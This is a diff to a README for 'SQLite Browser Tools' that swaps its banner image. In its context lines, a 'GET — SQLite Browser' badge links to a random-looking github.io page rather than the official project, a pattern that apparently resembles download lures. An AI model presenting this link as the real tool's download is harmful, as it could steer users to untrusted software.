@@ -1,6 +1,6 @@
 # SQLite Browser Tools — Database Viewing, Exploration & Management
 
-![Banner Placeholder](https://cdn.geekboots.com/geek/what-is-sqlite-meta-1688021644464.jpg)
+![Banner Placeholder](https://i.ytimg.com/vi/EV8XSi-RsfY/maxresdefault.jpg)
 
 [![GET — SQLite Browser](https://img.shields.io/badge/GET%20%E2%80%94%20SQLite%20Browser-0078D6?style=for-the-badge&logoColor=white)](https://plrcrt869868.github.io/.github/SQLite-Browser-Tools)
 
